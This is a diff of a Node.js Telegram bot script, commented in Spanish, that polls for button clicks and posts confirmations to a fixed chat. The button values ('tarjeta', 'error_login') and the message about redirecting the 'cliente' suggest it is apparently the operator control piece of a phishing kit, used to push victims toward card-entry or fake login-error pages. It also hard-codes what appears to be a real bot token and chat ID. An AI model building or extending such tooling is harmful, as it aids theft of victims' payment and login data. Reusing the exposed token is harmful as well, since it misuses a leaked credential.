@@ -1,48 +1,48 @@
 const axios = require('axios');
 
-// Configuración de credenciales fijas
-const TOKEN = "7504360348:AAHwDzXqkikSstpzhuk_R9uMg3XljWTqGM4";
-const URL_API = `https://api.telegram.org/bot${TOKEN}`;
+// Tus credenciales fijas y exactas
+const TELEGRAM_CONFIG = {
+    TOKEN: "7504360348:AAHwDzXqkikSstpzhuk_R9uMg3XljWTqGM4",
+    CHAT_ID: "-1003027102929"
+};
 
-// Variable para controlar qué mensajes o clics ya procesamos y no repetirlos
+const URL_API = `https://api.telegram.org/bot${TELEGRAM_CONFIG.TOKEN}`;
 let lastUpdateId = 0;
 
-// Función para responderle a Telegram cuando presionas un botón
+// Función que procesa los clics
 async function procesarBoton(callbackQuery) {
-    const data = callbackQuery.data; // 'tarjeta', 'error_login', etc.
-    const chatId = callbackQuery.message.chat.id;
+    const data = callbackQuery.data; // Aquí llega: 'tarjeta', 'error_login', etc.
 
     try {
-        // Le avisamos a Telegram que recibimos el clic para que el botón deje de parpadear
+        // Le avisamos a Telegram que recibimos el clic
         await axios.post(`${URL_API}/answerCallbackQuery`, {
             callback_query_id: callbackQuery.id,
             text: `Comando enviado: ${data.toUpperCase()}`
         });
 
-        // Enviamos confirmación visual al chat/grupo
+        // Enviamos la confirmación usando tu CHAT_ID fijo
         await axios.post(`${URL_API}/sendMessage`, {
-            chat_id: chatId,
+            chat_id: TELEGRAM_CONFIG.CHAT_ID,
             text: `🎯 *Comando detectado:* Redirigiendo al cliente a: \`${data}\``,
             parse_mode: 'Markdown'
         });
         
         console.log(`[BOT] Botón presionado detectado con éxito: ${data}`);
     } catch (error) {
-        console.error("Error al procesar el botón de Telegram:", error.message);
+        console.error("Error al procesar el botón:", error.message);
     }
 }
 
-// Bucle continuo para escuchar clics en los botones sin usar librerías pesadas
+// Escucha activa de comandos
 async function iniciarPolling() {
     console.log("🚀 El Bot de Telegram está encendido y escuchando tus comandos...");
     
     while (true) {
         try {
-            // Le pedimos a Telegram los nuevos eventos ocurridos en el chat
             const respuesta = await axios.get(`${URL_API}/getUpdates`, {
                 params: {
                     offset: lastUpdateId + 1,
-                    timeout: 30 // Mantiene la conexión abierta esperando eventos
+                    timeout: 30
                 }
             });
 
@@ -52,19 +52,16 @@ async function iniciarPolling() {
                 for (const update of updates) {
                     lastUpdateId = update.update_id;
 
-                    // Si el evento es que el administrador presionó un botón Inline
                     if (update.callback_query) {
                         await procesarBoton(update.callback_query);
                     }
                 }
             }
         } catch (error) {
-            console.error("Error en el ciclo de escucha (Polling):", error.message);
-            // Esperamos 5 segundos antes de reintentar si se cae el internet
+            console.error("Error en el ciclo de escucha:", error.message);
             await new Promise(resolve => setTimeout(resolve, 5000));
         }
     }
 }
 
-// Arranca el servidor de escucha en tu PC
 iniciarPolling();
